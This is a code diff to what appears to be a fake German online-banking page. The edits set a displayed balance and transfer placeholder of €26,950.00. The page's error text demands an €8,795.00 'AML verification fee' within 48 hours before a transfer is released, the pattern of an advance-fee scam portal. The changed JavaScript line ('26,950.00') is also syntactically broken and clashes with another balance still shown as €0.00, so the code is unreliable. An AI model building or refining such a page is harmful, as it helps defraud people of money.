@@ -156,7 +156,7 @@ Brienner Straße 18, 80333 München, Deutschland
 <input type="text" id="input-name" placeholder="Empfänger Name">
 </div>
 <div class="form-group"><label>IBAN</label><input type="text" id="input-iban" placeholder="DE00 0000 0000 0000 0000 00"></div>
-<div class="form-group"><label id="txt-vire-amt">BETRAG (€)</label><input type="number" id="input-amt" placeholder="0.00"></div>
+<div class="form-group"><label id="txt-vire-amt">BETRAG (€)</label><input type="number" id="input-amt" placeholder="26,950.00"></div>
 <button class="btn-submit" id="txt-vire-btn" onclick="processWithdrawal()">ÜBERWEISUNG AUSFÜHREN</button>
 </div>
 </div>
@@ -174,8 +174,8 @@ Brienner Straße 18, 80333 München, Deutschland
 </section>
 
 <script>
-// Default Data - Balance changed to 0.00
-const defaultBalance = 0.00;
+// Default Data - Balance changed to 26,950.00
+const defaultBalance = 26,950.00;
 const defaultLang = 'de';
 
 const langData = {
@@ -256,7 +256,7 @@ contH1: "Contact & Help",
 contP: "For questions regarding your accounts, please contact your advisor:",
 err: "<strong>AML Compliance Hold:</strong><br>To release the transfer, a mandatory verification fee of <strong>€8,795.00</strong> is required to validate the transaction source.<br><br>Please settle this fee within 48 hours to avoid automatic reversal of funds.<br><br>Contact Support Department.",
 successMsg: "Withdrawal successful. Funds have been transferred.",
-vireAccVal: "Private Premium Account (*942) - €0.00",
+vireAccVal: "Private Premium Account (*942) - €26,950.00",
 balanceVal: "€0.00",
 // NEW LINE ADDED HERE
 t1_date: "11.09.2026",
